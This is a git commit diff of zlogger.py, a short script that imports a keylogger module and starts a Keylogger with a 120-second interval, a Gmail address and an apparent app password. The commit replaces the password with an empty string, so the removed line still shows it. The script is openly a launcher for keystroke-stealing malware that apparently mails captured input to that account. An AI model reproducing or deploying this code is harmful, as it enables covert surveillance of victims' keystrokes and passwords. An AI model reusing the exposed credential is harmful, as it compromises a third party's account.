40129c838ce8de2efd2eb1a3df09e3ab16520d2b
Epameinondas Livogiannis <58298671+liboep@users.noreply.github.com>
2022-09-06 19:31:23 +0300

    Update zlogger.py

--- zlogger.py
+++ zlogger.py
@@ -2,5 +2,5 @@
 
 import keylogger
 
-my_keylogger = keylogger.Keylogger(120, 'testopoulos97@gmail.com', 'mqetbporvtsnijut')
+my_keylogger = keylogger.Keylogger(120, 'testopoulos97@gmail.com', '')
 my_keylogger.start()
